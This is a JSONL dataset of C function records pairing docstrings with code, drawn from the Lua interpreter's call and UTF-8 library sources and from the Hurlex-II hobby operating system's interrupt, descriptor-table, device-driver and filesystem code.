{"docstring": "/*\n** Call a function (C or Lua). The function to be called is at *func.\n** The arguments are on the stack, right after the function.\n** When returns, all the results are on the stack, starting at the original\n** function position.\n*/\n", "func_signal": "void luaD_call (lua_State *L, StkId func, int nResults, int allowyield)", "code": "{\n  if (++L->nCcalls >= LUAI_MAXCCALLS) {\n    if (L->nCcalls == LUAI_MAXCCALLS)\n      luaG_runerror(L, \"C stack overflow\");\n    else if (L->nCcalls >= (LUAI_MAXCCALLS + (LUAI_MAXCCALLS>>3)))\n      luaD_throw(L, LUA_ERRERR);  /* error while handing stack error */\n  }\n  if (!allowyield) L->nny++;\n  if (!luaD_precall(L, func, nResults))  /* is a Lua function? */\n    luaV_execute(L);  /* call it */\n  if (!allowyield) L->nny--;\n  L->nCcalls--;\n}", "path": "example\\luaTest\\lua\\ldo.c", "repo_name": "zsummer/zsummerX", "stars": 317, "license": "other", "language": "c", "size": 3161}
{"docstring": "/* this function handles only '%d', '%c', '%f', '%p', and '%s' \n   conventional formats, plus Lua-specific '%I' and '%U' */\n", "func_signal": "const char *luaO_pushvfstring (lua_State *L, const char *fmt, va_list argp)", "code": "{\n  int n = 0;\n  for (;;) {\n    const char *e = strchr(fmt, '%');\n    if (e == NULL) break;\n    luaD_checkstack(L, 2);  /* fmt + item */\n    pushstr(L, fmt, e - fmt);\n    switch (*(e+1)) {\n      case 's': {\n        const char *s = va_arg(argp, char *);\n        if (s == NULL) s = \"(null)\";\n        pushstr(L, s, strlen(s));\n        break;\n      }\n      case 'c': {\n        char buff = cast(char, va_arg(argp, int));\n        if (lisprint(cast_uchar(buff)))\n          pushstr(L, &buff, 1);\n        else  /* non-printable character; print its code */\n          luaO_pushfstring(L, \"<\\\\%d>\", cast_uchar(buff));\n        break;\n      }\n      case 'd': {\n        setivalue(L->top++, va_arg(argp, int));\n        luaO_tostring(L, L->top - 1);\n        break;\n      }\n      case 'I': {\n        setivalue(L->top++, cast(lua_Integer, va_arg(argp, l_uacInt)));\n        luaO_tostring(L, L->top - 1);\n        break;\n      }\n      case 'f': {\n        setfltvalue(L->top++, cast_num(va_arg(argp, l_uacNumber)));\n        luaO_tostring(L, L->top - 1);\n        break;\n      }\n      case 'p': {\n        char buff[4*sizeof(void *) + 8]; /* should be enough space for a '%p' */\n        int l = sprintf(buff, \"%p\", va_arg(argp, void *));\n        pushstr(L, buff, l);\n        break;\n      }\n      case 'U': {\n        char buff[UTF8BUFFSZ];\n        int l = luaO_utf8esc(buff, cast(long, va_arg(argp, long)));\n        pushstr(L, buff + UTF8BUFFSZ - l, l);\n        break;\n      }\n      case '%': {\n        pushstr(L, \"%\", 1);\n        break;\n      }\n      default: {\n        luaG_runerror(L, \"invalid option '%%%c' to 'lua_pushfstring'\",\n                         *(e + 1));\n      }\n    }\n    n += 2;\n    fmt = e+2;\n  }\n  luaD_checkstack(L, 1);\n  pushstr(L, fmt, strlen(fmt));\n  if (n > 0) luaV_concat(L, n + 1);\n  return svalue(L->top - 1);\n}", "path": "example\\luaTest\\lua\\lobject.c", "repo_name": "zsummer/zsummerX", "stars": 317, "license": "other", "language": "c", "size": 3161}
{"docstring": "/*\n** utf8len(s [, i [, j]]) --> number of characters that start in the\n** range [i,j], or nil + current position if 's' is not well formed in\n** that interval\n*/\n", "func_signal": "static int utflen (lua_State *L)", "code": "{\n  int n = 0;\n  size_t len;\n  const char *s = luaL_checklstring(L, 1, &len);\n  lua_Integer posi = u_posrelat(luaL_optinteger(L, 2, 1), len);\n  lua_Integer posj = u_posrelat(luaL_optinteger(L, 3, -1), len);\n  luaL_argcheck(L, 1 <= posi && --posi <= (lua_Integer)len, 2,\n                   \"initial position out of string\");\n  luaL_argcheck(L, --posj < (lua_Integer)len, 3,\n                   \"final position out of string\");\n  while (posi <= posj) {\n    const char *s1 = utf8_decode(s + posi, NULL);\n    if (s1 == NULL) {  /* conversion error? */\n      lua_pushnil(L);  /* return nil ... */\n      lua_pushinteger(L, posi + 1);  /* ... and current position */\n      return 2;\n    }\n    posi = s1 - s;\n    n++;\n  }\n  lua_pushinteger(L, n);\n  return 1;\n}", "path": "example\\luaTest\\lua\\lutf8lib.c", "repo_name": "zsummer/zsummerX", "stars": 317, "license": "other", "language": "c", "size": 3161}
{"docstring": "/*\n** Executes \"full continuation\" (everything in the stack) of a\n** previously interrupted coroutine until the stack is empty (or another\n** interruption long-jumps out of the loop). If the coroutine is\n** recovering from an error, 'ud' points to the error status, which must\n** be passed to the first continuation function (otherwise the default\n** status is LUA_YIELD).\n*/\n", "func_signal": "static void unroll (lua_State *L, void *ud)", "code": "{\n  if (ud != NULL)  /* error status? */\n    finishCcall(L, *(int *)ud);  /* finish 'lua_pcallk' callee */\n  while (L->ci != &L->base_ci) {  /* something in the stack */\n    if (!isLua(L->ci))  /* C function? */\n      finishCcall(L, LUA_YIELD);  /* complete its execution */\n    else {  /* Lua function */\n      luaV_finishOp(L);  /* finish interrupted instruction */\n      luaV_execute(L);  /* execute down to higher C 'boundary' */\n    }\n  }\n}", "path": "example\\luaTest\\lua\\ldo.c", "repo_name": "zsummer/zsummerX", "stars": 317, "license": "other", "language": "c", "size": 3161}
{"docstring": "/*\n** codepoint(s, [i, [j]])  -> returns codepoints for all characters\n** that start in the range [i,j]\n*/\n", "func_signal": "static int codepoint (lua_State *L)", "code": "{\n  size_t len;\n  const char *s = luaL_checklstring(L, 1, &len);\n  lua_Integer posi = u_posrelat(luaL_optinteger(L, 2, 1), len);\n  lua_Integer pose = u_posrelat(luaL_optinteger(L, 3, posi), len);\n  int n;\n  const char *se;\n  luaL_argcheck(L, posi >= 1, 2, \"out of range\");\n  luaL_argcheck(L, pose <= (lua_Integer)len, 3, \"out of range\");\n  if (posi > pose) return 0;  /* empty interval; return no values */\n  n = (int)(pose -  posi + 1);\n  if (posi + n <= pose)  /* (lua_Integer -> int) overflow? */\n    return luaL_error(L, \"string slice too long\");\n  luaL_checkstack(L, n, \"string slice too long\");\n  n = 0;\n  se = s + pose;\n  for (s += posi - 1; s < se;) {\n    int code;\n    s = utf8_decode(s, &code);\n    if (s == NULL)\n      return luaL_error(L, \"invalid UTF-8 code\");\n    lua_pushinteger(L, code);\n    n++;\n  }\n  return n;\n}", "path": "example\\luaTest\\lua\\lutf8lib.c", "repo_name": "zsummer/zsummerX", "stars": 317, "license": "other", "language": "c", "size": 3161}
{"docstring": "/*\n** returns true if function has been executed (C function)\n*/\n", "func_signal": "int luaD_precall (lua_State *L, StkId func, int nresults)", "code": "{\n  lua_CFunction f;\n  CallInfo *ci;\n  int n;  /* number of arguments (Lua) or returns (C) */\n  ptrdiff_t funcr = savestack(L, func);\n  switch (ttype(func)) {\n    case LUA_TLCF:  /* light C function */\n      f = fvalue(func);\n      goto Cfunc;\n    case LUA_TCCL: {  /* C closure */\n      f = clCvalue(func)->f;\n     Cfunc:\n      luaD_checkstack(L, LUA_MINSTACK);  /* ensure minimum stack size */\n      ci = next_ci(L);  /* now 'enter' new function */\n      ci->nresults = nresults;\n      ci->func = restorestack(L, funcr);\n      ci->top = L->top + LUA_MINSTACK;\n      lua_assert(ci->top <= L->stack_last);\n      ci->callstatus = 0;\n      luaC_checkGC(L);  /* stack grow uses memory */\n      if (L->hookmask & LUA_MASKCALL)\n        luaD_hook(L, LUA_HOOKCALL, -1);\n      lua_unlock(L);\n      n = (*f)(L);  /* do the actual call */\n      lua_lock(L);\n      api_checknelems(L, n);\n      luaD_poscall(L, L->top - n);\n      return 1;\n    }\n    case LUA_TLCL: {  /* Lua function: prepare its call */\n      StkId base;\n      Proto *p = clLvalue(func)->p;\n      n = cast_int(L->top - func) - 1;  /* number of real arguments */\n      luaD_checkstack(L, p->maxstacksize);\n      for (; n < p->numparams; n++)\n        setnilvalue(L->top++);  /* complete missing arguments */\n      if (!p->is_vararg) {\n        func = restorestack(L, funcr);\n        base = func + 1;\n      }\n      else {\n        base = adjust_varargs(L, p, n);\n        func = restorestack(L, funcr);  /* previous call can change stack */\n      }\n      ci = next_ci(L);  /* now 'enter' new function */\n      ci->nresults = nresults;\n      ci->func = func;\n      ci->u.l.base = base;\n      ci->top = base + p->maxstacksize;\n      lua_assert(ci->top <= L->stack_last);\n      ci->u.l.savedpc = p->code;  /* starting point */\n      ci->callstatus = CIST_LUA;\n      L->top = ci->top;\n      luaC_checkGC(L);  /* stack grow uses memory */\n      if (L->hookmask & LUA_MASKCALL)\n        callhook(L, ci);\n      return 0;\n    }\n    default: {  /* not a function */\n      luaD_checkstack(L, 1);  /* ensure space for metamethod */\n      func = restorestack(L, funcr);  /* previous call may change stack */\n      tryfuncTM(L, func);  /* try to get '__call' metamethod */\n      return luaD_precall(L, func, nresults);  /* now it must be a function */\n    }\n  }\n}", "path": "example\\luaTest\\lua\\ldo.c", "repo_name": "zsummer/zsummerX", "stars": 317, "license": "other", "language": "c", "size": 3161}
{"docstring": "/*\n** signal an error in the call to 'resume', not in the execution of the\n** coroutine itself. (Such errors should not be handled by any coroutine\n** error handler and should not kill the coroutine.)\n*/\n", "func_signal": "static l_noret resume_error (lua_State *L, const char *msg, StkId firstArg)", "code": "{\n  L->top = firstArg;  /* remove args from the stack */\n  setsvalue2s(L, L->top, luaS_new(L, msg));  /* push error message */\n  api_incr_top(L);\n  luaD_throw(L, -1);  /* jump back to 'lua_resume' */\n}", "path": "example\\luaTest\\lua\\ldo.c", "repo_name": "zsummer/zsummerX", "stars": 317, "license": "other", "language": "c", "size": 3161}
{"docstring": "/*\n** offset(s, n, [i])  -> index where n-th character counting from\n**   position 'i' starts; 0 means character at 'i'.\n*/\n", "func_signal": "static int byteoffset (lua_State *L)", "code": "{\n  size_t len;\n  const char *s = luaL_checklstring(L, 1, &len);\n  lua_Integer n  = luaL_checkinteger(L, 2);\n  lua_Integer posi = (n >= 0) ? 1 : len + 1;\n  posi = u_posrelat(luaL_optinteger(L, 3, posi), len);\n  luaL_argcheck(L, 1 <= posi && --posi <= (lua_Integer)len, 3,\n                   \"position out of range\");\n  if (n == 0) {\n    /* find beginning of current byte sequence */\n    while (posi > 0 && iscont(s + posi)) posi--;\n  }\n  else {\n    if (iscont(s + posi))\n      luaL_error(L, \"initial position is a continuation byte\");\n    if (n < 0) {\n       while (n < 0 && posi > 0) {  /* move back */\n         do {  /* find beginning of previous character */\n           posi--;\n         } while (posi > 0 && iscont(s + posi));\n         n++;\n       }\n     }\n     else {\n       n--;  /* do not move for 1st character */\n       while (n > 0 && posi < (lua_Integer)len) {\n         do {  /* find beginning of next character */\n           posi++;\n         } while (iscont(s + posi));  /* (cannot pass final '\\0') */\n         n--;\n       }\n     }\n  }\n  if (n == 0)  /* did it find given character? */\n    lua_pushinteger(L, posi + 1);\n  else  /* no such character */\n    lua_pushnil(L);\n  return 1;  \n}", "path": "example\\luaTest\\lua\\lutf8lib.c", "repo_name": "zsummer/zsummerX", "stars": 317, "license": "other", "language": "c", "size": 3161}
{"docstring": "/*\n** utfchar(n1, n2, ...)  -> char(n1)..char(n2)...\n*/\n", "func_signal": "static int utfchar (lua_State *L)", "code": "{\n  int n = lua_gettop(L);  /* number of arguments */\n  if (n == 1)  /* optimize common case of single char */\n    pushutfchar(L, 1);\n  else {\n    int i;\n    luaL_Buffer b;\n    luaL_buffinit(L, &b);\n    for (i = 1; i <= n; i++) {\n      pushutfchar(L, i);\n      luaL_addvalue(&b);\n    }\n    luaL_pushresult(&b);\n  }\n  return 1;\n}", "path": "example\\luaTest\\lua\\lutf8lib.c", "repo_name": "zsummer/zsummerX", "stars": 317, "license": "other", "language": "c", "size": 3161}
{"docstring": "/* }====================================================== */\n", "func_signal": "static const char *l_str2d (const char *s, lua_Number *result)", "code": "{\n  char *endptr;\n  if (strpbrk(s, \"nN\"))  /* reject 'inf' and 'nan' */\n    return NULL;\n  else if (strpbrk(s, \"xX\"))  /* hex? */\n    *result = lua_strx2number(s, &endptr);\n  else\n    *result = lua_str2number(s, &endptr);\n  if (endptr == s) return 0;  /* nothing recognized */\n  while (lisspace(cast_uchar(*endptr))) endptr++;\n  return (*endptr == '\\0' ? endptr : NULL);  /* OK if no trailing characters */\n}", "path": "example\\luaTest\\lua\\lobject.c", "repo_name": "zsummer/zsummerX", "stars": 317, "license": "other", "language": "c", "size": 3161}
{"docstring": "/*\n** Check whether __call metafield of 'func' is a function. If so, put\n** it in stack below original 'func' so that 'luaD_precall' can call\n** it. Raise an error if __call metafield is not a function.\n*/\n", "func_signal": "static void tryfuncTM (lua_State *L, StkId func)", "code": "{\n  const TValue *tm = luaT_gettmbyobj(L, func, TM_CALL);\n  StkId p;\n  if (!ttisfunction(tm))\n    luaG_typeerror(L, func, \"call\");\n  /* Open a hole inside the stack at 'func' */\n  for (p = L->top; p > func; p--)\n    setobjs2s(L, p, p-1);\n  L->top++;  /* slot ensured by caller */\n  setobj2s(L, func, tm);  /* tag method is the new function to be called */\n}", "path": "example\\luaTest\\lua\\ldo.c", "repo_name": "zsummer/zsummerX", "stars": 317, "license": "other", "language": "c", "size": 3161}
{"docstring": "/*\n** Decode one UTF-8 sequence, returning NULL if byte sequence is invalid.\n*/\n", "func_signal": "static const char *utf8_decode (const char *o, int *val)", "code": "{\n  static unsigned int limits[] = {0xFF, 0x7F, 0x7FF, 0xFFFF};\n  const unsigned char *s = (const unsigned char *)o;\n  unsigned int c = s[0];\n  unsigned int res = 0;  /* final result */\n  if (c < 0x80)  /* ascii? */\n    res = c;\n  else {\n    int count = 0;  /* to count number of continuation bytes */\n    while (c & 0x40) {  /* still have continuation bytes? */\n      int cc = s[++count];  /* read next byte */\n      if ((cc & 0xC0) != 0x80)  /* not a continuation byte? */\n        return NULL;  /* invalid byte sequence */\n      res = (res << 6) | (cc & 0x3F);  /* add lower 6 bits from cont. byte */\n      c <<= 1;  /* to test next bit */\n    }\n    res |= ((c & 0x7F) << (count * 5));  /* add first byte */\n    if (count > 3 || res > MAXUNICODE || res <= limits[count])\n      return NULL;  /* invalid byte sequence */\n    s += count;  /* skip continuation bytes read */\n  }\n  if (val) *val = res;\n  return (const char *)s + 1;  /* +1 to include first byte */\n}", "path": "example\\luaTest\\lua\\lutf8lib.c", "repo_name": "zsummer/zsummerX", "stars": 317, "license": "other", "language": "c", "size": 3161}
{"docstring": "// IRQ \u5904\u7406\u51fd\u6570\n", "func_signal": "void irq_handler(pt_regs_t *regs)", "code": "{\n        // \u91cd\u8bbePIC\u82af\u7247\n\tclear_interrupt_chip(regs->int_no);\n\n        if (interrupt_handlers[regs->int_no]) {\n                interrupt_handlers[regs->int_no](regs);\n        }\n}", "path": "arch\\i386\\intr\\intr.c", "repo_name": "hurley25/Hurlex-II", "stars": 452, "license": "gpl-2.0", "language": "c", "size": 586}
{"docstring": "// \u5185\u6838\u6ce8\u518c\u5b57\u7b26\u8bbe\u5907\n", "func_signal": "int add_char_dev(char_dev_t *cdev)", "code": "{\n        char_dev_t *p = char_devs;\n        while (p) {\n                if (strcmp(p->name, cdev->name) == 0) {\n                        return -1;\n                }\n                p = p->next;\n        }\n\n        cdev->next = char_devs;\n        char_devs = cdev;\n\n        return 0;\n}", "path": "driver\\char_dev.c", "repo_name": "hurley25/Hurlex-II", "stars": 452, "license": "gpl-2.0", "language": "c", "size": 586}
{"docstring": "// \u8bbe\u7f6e 8259A \u82af\u7247\n", "func_signal": "void init_interrupt_chip(void)", "code": "{\n        // \u91cd\u65b0\u6620\u5c04 IRQ \u8868\n        // \u4e24\u7247\u7ea7\u8054\u7684 Intel 8259A \u82af\u7247\n        // \u4e3b\u7247\u7aef\u53e3 0x20 0x21\n        // \u4ece\u7247\u7aef\u53e3 0xA0 0xA1\n        \n        // \u521d\u59cb\u5316\u4e3b\u7247\u3001\u4ece\u7247\n        // 0001 0001\n        outb(IO_PIC1, 0x11);\n        outb(IO_PIC2, 0x11);\n\n        // \u8bbe\u7f6e\u4e3b\u7247 IRQ \u4ece 0x20(32) \u53f7\u4e2d\u65ad\u5f00\u59cb\n        outb(IO_PIC1C, 0x20);\n\n        // \u8bbe\u7f6e\u4ece\u7247 IRQ \u4ece 0x28(40) \u53f7\u4e2d\u65ad\u5f00\u59cb\n        outb(IO_PIC2C, 0x28);\n        \n        // \u8bbe\u7f6e\u4e3b\u7247 IR2 \u5f15\u811a\u8fde\u63a5\u4ece\u7247\n        outb(IO_PIC1C, 0x04);\n\n        // \u544a\u8bc9\u4ece\u7247\u8f93\u51fa\u5f15\u811a\u548c\u4e3b\u7247 IR2 \u53f7\u76f8\u8fde\n        outb(IO_PIC2C, 0x02);\n        \n        // \u8bbe\u7f6e\u4e3b\u7247\u548c\u4ece\u7247\u6309\u7167 8086 \u7684\u65b9\u5f0f\u5de5\u4f5c\n        outb(IO_PIC1C, 0x01);\n        outb(IO_PIC2C, 0x01);\n        \n        // \u8bbe\u7f6e\u4e3b\u4ece\u7247\u5141\u8bb8\u4e2d\u65ad\n        outb(IO_PIC1C, 0x0);\n        outb(IO_PIC2C, 0x0);\n}", "path": "arch\\i386\\driver\\pic.c", "repo_name": "hurley25/Hurlex-II", "stars": 452, "license": "gpl-2.0", "language": "c", "size": 586}
{"docstring": "// \u8bbe\u5907\u521d\u59cb\u5316\n", "func_signal": "static int kb_init(void)", "code": "{\n        // \u91c7\u7528US\u5b57\u7b26\u96c6\n        kb_device.curr_layout = &us_keymap;\n\n        // \u8bbe\u7f6e\u8bbe\u5907\u53ef\u7528\n        kb_device.is_valid = true;\n\n        // \u6ce8\u518c\u952e\u76d8\u4e2d\u65ad\u5904\u7406\u51fd\u6570\n        register_interrupt_handler(IRQ1, &keyboard_handler);\n\n        return 0;\n}", "path": "driver\\kboard.c", "repo_name": "hurley25/Hurlex-II", "stars": 452, "license": "gpl-2.0", "language": "c", "size": 586}
{"docstring": "// \u5916\u90e8\u8bbe\u5907\u521d\u59cb\u5316\n", "func_signal": "void device_init(void)", "code": "{\n        char_dev_init();\n        block_dev_init();\n}", "path": "driver\\device.c", "repo_name": "hurley25/Hurlex-II", "stars": 452, "license": "gpl-2.0", "language": "c", "size": 586}
{"docstring": "// \u8bbe\u5907\u8bfb\u53d6\n", "func_signal": "static int kb_read(void *dec, uint32_t len)", "code": "{\n        uint8_t *buffer = (uint8_t *)dec;\n        uint8_t ch = 0;\n        uint32_t i = 0;\n        while (i < len) {\n                if ((ch = kb_getchar()) != 0) {\n                        buffer[i] = ch;\n                        i++;\n                } else {\n                        break;\n                }\n        }\n\n        return i;\n}", "path": "driver\\kboard.c", "repo_name": "hurley25/Hurlex-II", "stars": 452, "license": "gpl-2.0", "language": "c", "size": 586}
{"docstring": "// \u8bbe\u5907\u63a7\u5236\n", "func_signal": "static int kb_ioctl(int op, int flag)", "code": "{\n        if (op != 0 && flag != 0) {\n                return -1;\n        }\n\n        return 0;\n}", "path": "driver\\kboard.c", "repo_name": "hurley25/Hurlex-II", "stars": 452, "license": "gpl-2.0", "language": "c", "size": 586}
{"docstring": "// \u8bfb\u53d6super_block\n", "func_signal": "static struct super_block *sfs_read_super(struct super_block *sb)", "code": "{\n        sfs_sb = NULL;\n\n        return NULL;\n}", "path": "fs\\sfs\\sfs.c", "repo_name": "hurley25/Hurlex-II", "stars": 452, "license": "gpl-2.0", "language": "c", "size": 586}
{"docstring": "// \u521d\u59cb\u5316\u5168\u5c40\u63cf\u8ff0\u7b26\u8868\n", "func_signal": "void gdt_init(void)", "code": "{\n        // \u5168\u5c40\u63cf\u8ff0\u7b26\u8868\u754c\u9650  \u4ece 0 \u5f00\u59cb\uff0c\u6240\u4ee5\u603b\u957f\u8981 - 1\n        gdt_ptr.limit = sizeof(gdt_entry_t) * GDT_LENGTH - 1;\n        gdt_ptr.base = (uint32_t)&gdt_entries;\n        \n        // \u91c7\u7528 Intel \u5e73\u5766\u6a21\u578b\n        gdt_set_gate(SEG_NULL,  0x0, 0x0, 0x0, 0x0);            // Intel\u6587\u6863\u8981\u6c42\u9996\u4e2a\u63cf\u8ff0\u7b26\u51680\n        gdt_set_gate(SEG_KTEXT, 0x0, 0xFFFFFFFF, 0x9A, 0xC0);   // \u5185\u6838\u6307\u4ee4\u6bb5\n        gdt_set_gate(SEG_KDATA, 0x0, 0xFFFFFFFF, 0x92, 0xC0);   // \u5185\u6838\u6570\u636e\u6bb5\n        gdt_set_gate(SEG_UTEXT, 0x0, 0xFFFFFFFF, 0xFA, 0xC0);   // \u7528\u6237\u6a21\u5f0f\u4ee3\u7801\u6bb5\n        gdt_set_gate(SEG_UDATA, 0x0, 0xFFFFFFFF, 0xF2, 0xC0);   // \u7528\u6237\u6a21\u5f0f\u6570\u636e\u6bb5\n        \n        tss_set_gate(SEG_TSS, KERNEL_DS, 0);\n        \n        // \u52a0\u8f7d\u5168\u5c40\u63cf\u8ff0\u7b26\u8868\u5730\u5740\u5230 GPTR \u5bc4\u5b58\u5668\n        gdt_flush((uint32_t)&gdt_ptr);\n        \n        // \u52a0\u8f7d\u4efb\u52a1\u5bc4\u5b58\u5668\n\ttss_flush();\n}", "path": "arch\\i386\\mm\\gdt.c", "repo_name": "hurley25/Hurlex-II", "stars": 452, "license": "gpl-2.0", "language": "c", "size": 586}
{"docstring": "// \u8c03\u7528\u4e2d\u65ad\u5904\u7406\u51fd\u6570\n", "func_signal": "void isr_handler(pt_regs_t *regs)", "code": "{\n        if (interrupt_handlers[regs->int_no]) {\n              interrupt_handlers[regs->int_no](regs);\n        } else {\n                cprintk(rc_black, rc_blue, \"Unhandled interrupt: %d %s\\n\", regs->int_no, intrname(regs->int_no));\n                cpu_hlt();\n        }\n}", "path": "arch\\i386\\intr\\intr.c", "repo_name": "hurley25/Hurlex-II", "stars": 452, "license": "gpl-2.0", "language": "c", "size": 586}
{"docstring": "// \u6587\u4ef6\u7cfb\u7edf\u521d\u59cb\u5316\n", "func_signal": "void fs_init(void)", "code": "{\n        vfs_init();\n        device_init();\n        sfs_init();\n}", "path": "fs\\fs.c", "repo_name": "hurley25/Hurlex-II", "stars": 452, "license": "gpl-2.0", "language": "c", "size": 586}
{"docstring": "// \u5b57\u7b26\u8bbe\u5907\u521d\u59cb\u5316\n", "func_signal": "void char_dev_init(void)", "code": "{\n        char_dev_t *kb_dev = &kboard_dev;\n        kb_dev->ops.init();\n        add_char_dev(kb_dev);\n\n        cprintk(rc_black, rc_magenta, \"Init %s device ...\\n\\n\", kb_dev->ops.get_desc());\n}", "path": "driver\\char_dev.c", "repo_name": "hurley25/Hurlex-II", "stars": 452, "license": "gpl-2.0", "language": "c", "size": 586}
{"docstring": "// \u8bfb\u53d6 block_map\n", "func_signal": "static int sfs_read_block_map(void)", "code": "{\n        sfs_block_map = NULL;\n        return 0;\n}", "path": "fs\\sfs\\sfs.c", "repo_name": "hurley25/Hurlex-II", "stars": 452, "license": "gpl-2.0", "language": "c", "size": 586}
{"docstring": "// \u521d\u59cb\u5316\u6587\u4ef6\u7cfb\u7edf\n", "func_signal": "static void sfs_mkfs(uint32_t start_sec, uint32_t end_sec, uint32_t block_size)", "code": "{\n        uint32_t sb_start = start_sec + SUPER_BLOCK_OFFSET;          // super_block \u8d77\u59cb\u6247\u533a\n        uint32_t all_sec = end_sec - start_sec - INODEMAP_OFFSET;    // \u53ef\u7528\u6247\u533a\u6570\n\n        // inode : block = 1 : 9\n        uint32_t in_secs = all_sec / 10;                   // inode \u6240\u5360\u6247\u533a\u6570\n        uint32_t bl_secs = all_sec / 10 * 9;               // block \u6240\u5360\u6247\u533a\u6570\n        uint32_t in_count = in_secs;                       // inode \u6570\u91cf\n        uint32_t bl_count = bl_secs / (block_size / 512);  // block \u6570\u91cf\n        uint32_t im_start = start_sec + INODEMAP_OFFSET;   // inode map \u8d77\u59cb\n        uint32_t im_secs  = in_secs / 512 + 1;             // inode map \u6240\u5360\u6247\u533a\u6570\n        uint32_t bm_start = im_start + im_secs;            // block map \u8d77\u59cb\u5730\u5740\n        uint32_t bm_secs  = bl_secs / block_size + 1;      // block map \u6240\u5360\u6247\u533a\u6570\n        uint32_t in_start = bm_start + bm_secs;            // inode \u8d77\u59cb\u4f4d\u7f6e\n        uint32_t bl_start = in_start + in_secs;            // block \u8d77\u59cb\u4f4d\u7f6e\n\n        printk(\"super_block start: %u\\n\", sb_start);\n        printk(\"all          secs: %u\\n\\n\", all_sec);\n        printk(\"inode_map   start: %u\\n\", im_start);\n        printk(\"inode_map    secs: %u\\n\\n\", im_secs);\n        printk(\"block_map   start: %u\\n\", bm_start);\n        printk(\"block_map    secs: %u\\n\\n\", bm_secs);\n        printk(\"inode       start: %u\\n\", in_start);\n        printk(\"inode        secs: %u\\n\", in_secs);\n        printk(\"inode       count: %u\\n\\n\", in_count);\n        printk(\"block       start: %u\\n\", bl_start);\n        printk(\"block        secs: %u\\n\", bl_secs);\n        printk(\"block       count: %u\\n\\n\", bl_count);\n        printk(\"max file size: %u B ~= %d MB\\n\\n\", MAX_FILE_SIZE, MAX_FILE_SIZE / 1024 / 1024);\n\n        struct sfs_super_block sfs_sb;\n        bzero(&sfs_sb, sizeof(sfs_sb));\n\n        sfs_sb.s_type = SFS_T;\n        sfs_sb.s_inode_count = in_count;\n        sfs_sb.s_block_count = bl_count;\n        sfs_sb.s_block_size = block_size;\n        sfs_sb.s_max_file = MAX_FILE_SIZE;\n        sfs_sb.s_root_inode = 0;\n\n        sfs_sb.in_secs = in_secs;\n        sfs_sb.bl_secs = bl_secs;\n        sfs_sb.im_start = im_start;\n        sfs_sb.im_secs = im_secs;\n        sfs_sb.bm_start = bm_start;\n        sfs_sb.bm_secs = bm_secs;\n        sfs_sb.in_start = in_start;\n        sfs_sb.bl_start = bl_start;\n}", "path": "fs\\sfs\\sfs.c", "repo_name": "hurley25/Hurlex-II", "stars": 452, "license": "gpl-2.0", "language": "c", "size": 586}
{"docstring": "// \u8bbe\u7f6e\u4e2d\u65ad\u63cf\u8ff0\u7b26\n", "func_signal": "static void idt_set_gate(uint8_t num, uint32_t base, uint16_t sel, uint8_t flags)", "code": "{\n        idt_entries[num].base_lo = base & 0xFFFF;\n        idt_entries[num].base_hi = (base >> 16) & 0xFFFF;\n\n        idt_entries[num].sel = sel;\n        idt_entries[num].always0 = 0;\n\n        idt_entries[num].flags = flags;\n}", "path": "arch\\i386\\intr\\intr.c", "repo_name": "hurley25/Hurlex-II", "stars": 452, "license": "gpl-2.0", "language": "c", "size": 586}
{"docstring": "// \u521d\u59cb\u5316\u4e2d\u65ad\u63cf\u8ff0\u7b26\u8868\n", "func_signal": "void idt_init(void)", "code": "{\n        init_interrupt_chip();\n\n        idt_ptr.limit = sizeof(idt_entry_t) * INTERRUPT_MAX - 1;\n        idt_ptr.base  = (uint32_t)&idt_entries;\n\n        // 0~31:  \u7528\u4e8e CPU \u7684\u4e2d\u65ad\u5904\u7406\n        // 32~47: Intel \u4fdd\u7559\n        for (uint32_t i = 0; i < 48; ++i) {\n                idt_set_gate(i, (uint32_t)isr_irq_func[i], 0x08, 0x8E);\n        }\n\n        // 128 (0x80) \u5c06\u6765\u7528\u4e8e\u5b9e\u73b0\u7cfb\u7edf\u8c03\u7528\n        idt_set_gate(128, (uint32_t)isr128, 0x08, 0xEF);\n\n        // \u66f4\u65b0\u8bbe\u7f6e\u4e2d\u65ad\u63cf\u8ff0\u7b26\u8868\n        idt_flush((uint32_t)&idt_ptr);\n}", "path": "arch\\i386\\intr\\intr.c", "repo_name": "hurley25/Hurlex-II", "stars": 452, "license": "gpl-2.0", "language": "c", "size": 586}
{"docstring": "// \u8bfb\u53d6 inode_map\n", "func_signal": "static int sfs_read_inode_map(void)", "code": "{\n        sfs_inode_map = NULL;\n\n        return 0;\n}", "path": "fs\\sfs\\sfs.c", "repo_name": "hurley25/Hurlex-II", "stars": 452, "license": "gpl-2.0", "language": "c", "size": 586}
{"docstring": "// \u5185\u6838\u6ce8\u518c\u5757\u8bbe\u5907\n", "func_signal": "int add_block_dev(block_dev_t *bdev)", "code": "{\n        block_dev_t *p = block_devs;\n        while (p) {\n                if (strcmp(p->name, bdev->name) == 0) {\n                        return -1;\n                }\n                p = p->next;\n        }\n\n        bdev->next = block_devs;\n        block_devs = bdev;\n\n        return 0;\n}", "path": "driver\\block_dev.c", "repo_name": "hurley25/Hurlex-II", "stars": 452, "license": "gpl-2.0", "language": "c", "size": 586}
{"docstring": "// \u5757\u8bbe\u5907\u521d\u59cb\u5316\n", "func_signal": "void block_dev_init(void)", "code": "{\n        cprintk(rc_black, rc_red, \"Init IDE Driver ...\\n\");\n\n        block_dev_t *ide_dev = &ide_main_dev;\n        if (ide_dev->ops.init() == -1) {\n                printk(\"Main IDE Device Not Found!\\n\");\n                return;\n        }\n\n        add_block_dev(ide_dev);\n\n        if (!ide_dev->ops.device_valid()) {\n                printk(\"Main IDE Device Error!\\n\");\n                return;\n        }\n\n        cprintk(rc_black, rc_red, \"Found IDE Driver: %u (sectors)  Desc: %s\\n\",\n                        ide_dev->ops.get_nr_block(), ide_dev->ops.get_desc());\n\n        if (read_mbr_info(ide_dev) != 0) {\n                printk(\"Read MBR Info Error!\");\n        }\n}", "path": "driver\\block_dev.c", "repo_name": "hurley25/Hurlex-II", "stars": 452, "license": "gpl-2.0", "language": "c", "size": 586}
